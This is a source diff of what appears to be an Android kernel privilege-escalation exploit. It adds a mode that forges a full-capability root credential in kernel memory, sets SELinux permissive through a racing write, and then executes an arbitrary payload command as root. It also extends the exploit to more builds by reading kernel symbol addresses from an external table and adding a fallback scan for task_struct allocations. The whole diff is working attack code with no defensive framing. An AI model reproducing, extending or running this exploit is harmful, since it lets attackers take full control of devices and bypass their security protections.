@@ -136,11 +136,14 @@ static unsigned long long g_rel_static, g_rel_off;
  * this removes every per-build constant from the de-tag step. */
 static unsigned long long g_text_runtime, g_tp_runtime, g_selinux_runtime;
 static unsigned long long g_tp_link, g_selinux_link;
+static unsigned long long g_root_user_link, g_init_user_ns_link;
+static unsigned long long g_init_ucounts_link, g_init_groups_link;
 static int g_rel_mode;
 static unsigned long long g_slide;
 static unsigned long long g_rel_abs;
 static int g_held;
 static int g_fake_stage;
+static int g_exec_payload; /* ksu mode: run PAYLOAD_CMD as the fake-cred root */
 static int g_full_shell;
 static int g_root_ok;
 static int g_diag;
@@ -393,32 +396,45 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
 static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out)
 {
-    int found = 0;
+    int pass, found = 0;
 
-    for (size_t i = 8; i + 32 <= n; i += 4)
+    /* Pass 0 filters on the profile's copy_process call site.  Builds whose
+     * layout differs yield nothing there (observed: task_recs=0 on
+     * 16.2.20.3 and 16.1.17.10), so pass 1 keeps only the size filter: a
+     * task_struct allocation is one of the very few caches with a ~0x1500
+     * object, and the record must still belong to the forking parent. */
+    for (pass = 0; pass < 2; pass++)
     {
-        unsigned long long site, ptr, req, alloc;
-
-        if (u32(b, i - 4) != (unsigned)pid)
-            continue;
-        site = u64(b, i);
+        found = 0;
+        for (size_t i = 8; i + 32 <= n; i += 4)
         {
-            unsigned long long low = site & 0x1fffffULL;
-            if (low != COPY_PROCESS_LOW21 && low != COPY_PROCESS_LOW21_2)
+            unsigned long long site, ptr, req, alloc;
+
+            if (u32(b, i - 4) != (unsigned)pid)
                 continue;
+            site = u64(b, i);
+            if (!pass)
+            {
+                unsigned long long low = site & 0x1fffffULL;
+
+                if (low != COPY_PROCESS_LOW21 && low != COPY_PROCESS_LOW21_2)
+                    continue;
+            }
+            ptr = u64(b, i + 8);
+            req = u64(b, i + 16);
+            alloc = u64(b, i + 24);
+            if (!is_kernel_ptr(ptr))
+                continue;
+            /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
+            if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
+                req != 0x1440 && alloc != 0x1440 &&
+                req != 0x1640 && alloc != 0x1640)
+                continue;
+            *out = ptr;
+            found++;
         }
-        ptr = u64(b, i + 8);
-        req = u64(b, i + 16);
-        alloc = u64(b, i + 24);
-        if (!is_kernel_ptr(ptr))
-            continue;
-        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
-        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
-            req != 0x1440 && alloc != 0x1440 &&
-            req != 0x1640 && alloc != 0x1640)
-            continue;
-        *out = ptr;
-        found++;
+        if (found)
+            break;
     }
     return found;
 }
@@ -1858,14 +1874,25 @@ static void run_plant(unsigned long long target, int tag, int mode,
             *(unsigned long long *)(payload + off + OFF_CRED_CAP_AMB) = FULLCAP;
             *(unsigned long long *)(payload + off + OFF_CRED_SECURITY) =
                 page + blob; /* security */
+            /* Prefer the external table's symbols (any build) over the
+             * profile constants; the slide is already known here. */
             *(unsigned long long *)(payload + off + OFF_CRED_USER) =
-                ROOT_USER_STATIC + g_slide;
+                (g_root_user_link ? g_root_user_link : ROOT_USER_STATIC) +
+                g_slide;
             *(unsigned long long *)(payload + off + OFF_CRED_USER_NS) =
-                INIT_USER_NS_STATIC + g_slide;
+                (g_init_user_ns_link ? g_init_user_ns_link
+                                     : INIT_USER_NS_STATIC) +
+                g_slide;
+#if CRED_HAS_UCOUNTS
             *(unsigned long long *)(payload + off + OFF_CRED_UCOUNTS) =
-                INIT_UCOUNTS_STATIC + g_slide;
+                (g_init_ucounts_link ? g_init_ucounts_link
+                                     : INIT_UCOUNTS_STATIC) +
+                g_slide;
+#endif
             *(unsigned long long *)(payload + off + OFF_CRED_GROUP_INFO) =
-                INIT_GROUPS_STATIC + g_slide;
+                (g_init_groups_link ? g_init_groups_link
+                                    : INIT_GROUPS_STATIC) +
+                g_slide;
             *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
                 SELINUX_SID_KERNEL;
             *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
@@ -2244,6 +2271,20 @@ static int wait_child_main(const char *mode)
                 _exit(127);
             }
 
+            const char *pc = getenv("PAYLOAD_CMD");
+
+            if (g_exec_payload && pc && *pc)
+            {
+                char *const pv[] = {(char *)"sh", (char *)"-c", (char *)pc,
+                                    NULL};
+
+                logf("[ksu] exec payload uid=%d euid=%d\n", getuid(),
+                     geteuid());
+                errno = 0;
+                execve("/system/bin/sh", pv, envp);
+                logf("[-] payload exec failed errno=%d\n", errno);
+                _exit(127);
+            }
             char *const av[] = {(char *)"sh",
                                 (char *)"/data/local/tmp/ksu_stage.sh", NULL};
 
@@ -2405,13 +2446,51 @@ static int read_syms_file(const char *path)
             continue;
         if (!strcmp(name, "__tracepoint_sys_exit"))
         {
-            g_tp_link = v;
-            n++;
+            if (!g_tp_link)
+            {
+                g_tp_link = v;
+                n++;
+            }
         }
         else if (!strcmp(name, "selinux_state"))
         {
-            g_selinux_link = v;
-            n++;
+            if (!g_selinux_link)
+            {
+                g_selinux_link = v;
+                n++;
+            }
+        }
+        else if (!strcmp(name, "root_user"))
+        {
+            if (!g_root_user_link)
+            {
+                g_root_user_link = v;
+                n++;
+            }
+        }
+        else if (!strcmp(name, "init_user_ns"))
+        {
+            if (!g_init_user_ns_link)
+            {
+                g_init_user_ns_link = v;
+                n++;
+            }
+        }
+        else if (!strcmp(name, "init_ucounts"))
+        {
+            if (!g_init_ucounts_link)
+            {
+                g_init_ucounts_link = v;
+                n++;
+            }
+        }
+        else if (!strcmp(name, "init_groups"))
+        {
+            if (!g_init_groups_link)
+            {
+                g_init_groups_link = v;
+                n++;
+            }
         }
     }
     fclose(f);
@@ -2839,6 +2918,14 @@ int main(int argc, char **argv)
         g_full_shell = 1;
         g_fake_stage = 1;
     }
+    if (argc > 1 && !strcmp(argv[1], "ksu"))
+    {
+        /* KSU handoff: run the fake-cred endgame and, once the child holds
+         * the full-capability cred, exec the App-provided payload command
+         * (its ksu_handoff.sh + proof) instead of an interactive shell. */
+        g_fake_stage = 1;
+        g_exec_payload = 1;
+    }
     if (argc > 1 && !strcmp(argv[1], "sites")) {
         setvbuf(stdout, NULL, _IONBF, 0);
         pin(g_cpu);
@@ -2870,21 +2957,6 @@ int main(int argc, char **argv)
         /* Force the anchor vote (offline checks): hide what
          * kallsyms gave us so the vote must stand on its own. */
         g_text_runtime = g_tp_runtime = g_selinux_runtime = 0;
-    }
-    {
-        /* The old tool's generated table (if the user pushed one) wins over
-         * the built-in tables: it is the only source for builds we do not
-         * ship, e.g. PD2425 / 16.1.17.10. */
-        const char *sf = getenv("IC_SYMS_FILE");
-
-        if (!sf || !*sf)
-            sf = "/data/local/tmp/ic-syms.txt";
-        {
-            int sn = read_syms_file(sf);
-
-            logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
-                 g_tp_link, g_selinux_link);
-        }
     }
     if (!g_tp_runtime && !g_text_runtime)
     {
@@ -2930,6 +3002,22 @@ int main(int argc, char **argv)
             }
         }
     }
+    {
+        /* The old tool's generated table (if the user pushed one) wins over
+         * the built-in tables: it is the only source for builds we do not
+         * ship, e.g. PD2425 / 16.1.17.10. */
+        const char *sf = getenv("IC_SYMS_FILE");
+
+        if (!sf || !*sf)
+            sf = "/data/local/tmp/ic-syms.txt";
+        {
+            int sn = read_syms_file(sf);
+
+            logf("[syms] %s -> %d (tp=%#llx selinux=%#llx)\n", sf, sn,
+                 g_tp_link, g_selinux_link);
+        }
+    }
+
     if (argc > 2 && !strcmp(argv[1], "cpu"))
         g_cpu = atoi(argv[2]);
 
@@ -3007,7 +3095,8 @@ int main(int argc, char **argv)
         logf("[+] leak-only run complete\n");
         return 0;
     }
-    if (g_fake_stage && !g_full_shell && write_ksu_script() != 0)
+    if (g_fake_stage && !g_full_shell && !g_exec_payload &&
+        write_ksu_script() != 0)
     {
         /* No usable stage script means no handoff.  Stop before the plants
          * touch anything, and release the blocked child the same way the
@@ -3070,15 +3159,15 @@ int main(int argc, char **argv)
     {
         struct plant_res fc;
 
-        if (!g_static_ok)
+        if (!g_static_ok &&
+            !(g_selinux_link && g_root_user_link && g_init_user_ns_link &&
+              g_init_groups_link && g_tp_link))
         {
-            /* The fake endgame needs selinux_state / init_* / TP absolute
-             * addresses; without a profile match those cannot be derived,
-             * and a wrong slide would aim every write at this build's
-             * unknown layout. */
-            logf("[-] fake path needs the profile's static addresses; this "
-                 "build's timer site differs -- run without a mode for the "
-                 "shell path\n");
+            /* The fake endgame needs the per-build selinux_state / init_*
+             * / TP addresses.  Either the profile matches or an external
+             * syms table supplies them (0.12.7+). */
+            logf("[-] fake path needs per-build addresses; push a syms "
+                 "table (ic-syms.txt) or run the shell path\n");
             close(go_fd);
             close(st_fd);
             kill(C, SIGKILL);
@@ -3127,7 +3216,8 @@ int main(int argc, char **argv)
          * the framework came up normally with zero aborts. */
         logf("[+] fake: set SELinux permissive before vr\n");
         g_rel_mode = 1;
-        g_rel_static = SELINUX_STATE_STATIC - 7;
+        g_rel_static = (g_selinux_link ? g_selinux_link
+                                       : SELINUX_STATE_STATIC) - 7;
         g_rel_off = 0;
         /* This plant is a pure race and misses often -- several consecutive
          * cold-boot attempts have been seen to miss it outright.  Every miss is
